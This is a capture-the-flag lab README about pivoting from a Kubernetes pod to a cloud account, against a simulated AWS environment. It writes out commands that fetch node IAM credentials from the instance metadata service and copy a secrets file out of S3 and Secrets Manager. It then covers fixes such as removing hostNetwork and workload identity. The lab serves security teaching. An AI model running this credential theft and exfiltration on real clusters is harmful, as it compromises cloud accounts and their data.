# K08 — Cluster-to-Cloud Lateral Movement · NimbusMart CTF

**Difficulty:** Hard · **300 pts** · **Flag:** `FLAG{...}`

## Briefing
You have a shell in NimbusMart's `platform/data-exporter` pod. It runs with
`hostNetwork: true` and no egress restriction, so it sits on the node's network
right next to the cloud instance metadata service (IMDS). On a real EKS/GKE/AKS
node that endpoint (`http://169.254.169.254/`) hands out the **node's** cloud
credentials. Steal them and you pivot out of the cluster and into the cloud
account.

This range **simulates a real AWS account** with [LocalStack](https://localstack.cloud)
(S3, STS, Secrets Manager) plus an IMDS emulator that hands out the node's IAM
role credentials — and the `data-exporter` pod ships the real `aws` CLI. The
crown jewels (NimbusMart's DB backup) live in an S3 bucket in that account.

**Objective:** steal the node's cloud credentials from IMDS, then use `aws` to
pivot into the account and exfiltrate `s3://nimbusmart-prod-backups/db-backup/credentials.txt`.
Its contents are the flag.

## Capture the flag
```bash
# Stand up the fake cloud (LocalStack seeds S3 + Secrets Manager on ready) + IMDS,
# then deploy the vulnerable exporter
kubectl apply -f setup.yaml
kubectl -n platform rollout status deploy/localstack   # wait for the account to seed
kubectl apply -f vulnerable.yaml

# 1) The node's temporary credentials, straight from the metadata service
kubectl exec -n platform data-exporter -- \
  curl -s http://imds.platform.svc.cluster.local/latest/meta-data/iam/security-credentials/nimbusmart-node-role

# 2) The aws CLI auto-discovers those IMDS creds — prove the pivot
kubectl exec -n platform data-exporter -- aws sts get-caller-identity

# 3) Exfiltrate the backup bucket -> FLAG
kubectl exec -n platform data-exporter -- \
  aws s3 cp s3://nimbusmart-prod-backups/db-backup/credentials.txt -
#  -> FLAG{pod_stole_node_cloud_credentials}

# (Secrets Manager works too)
kubectl exec -n platform data-exporter -- \
  aws secretsmanager get-secret-value --secret-id nimbusmart/prod/db-master --query SecretString --output text
```

The `imds.platform.svc.cluster.local` service stands in for
`http://169.254.169.254/latest/meta-data/iam/security-credentials/<node-role>`,
and `AWS_ENDPOINT_URL` points the CLI at the fake account (LocalStack).

## Patch & verify
```bash
kubectl delete -f vulnerable.yaml
kubectl apply -f fixed.yaml

# The pivot is dead — hostNetwork gone AND the SDK won't read IMDS
kubectl exec -n platform data-exporter -- aws sts get-caller-identity 2>&1 | head -1
#  -> Unable to locate credentials

# Prove it with the checker
cd ../../checker && go run . --check k08 -n platform
```

## CNI caveat (read this)
kind's default CNI, **kindnet, does not enforce NetworkPolicy**. The
default-deny egress policy in `fixed.yaml` is correct and *would* be enforced by
Calico, Cilium, or any cloud CNI — but on stock kind it is advisory only. The
control this lab actually verifies is the **removal of `hostNetwork`**: that
alone takes the pod off the node network and closes the IMDS path, and it is
what the `k08` checker asserts (along with "no over-broad cloud credentials in
pod env").

## The right way to give a pod cloud access
Never let a pod inherit the node IAM role through IMDS. Give each workload its
own scoped, short-lived identity, and lock down the node metadata endpoint:

- **AWS EKS:** IAM Roles for Service Accounts (IRSA) or EKS Pod Identity; set the
  node IMDS hop limit to 1 and require IMDSv2.
- **GKE:** Workload Identity (disable the legacy metadata server for workloads).
- **AKS:** Microsoft Entra Workload ID.

## Cleanup
```bash
kubectl delete -f vulnerable.yaml -f setup.yaml --ignore-not-found
```
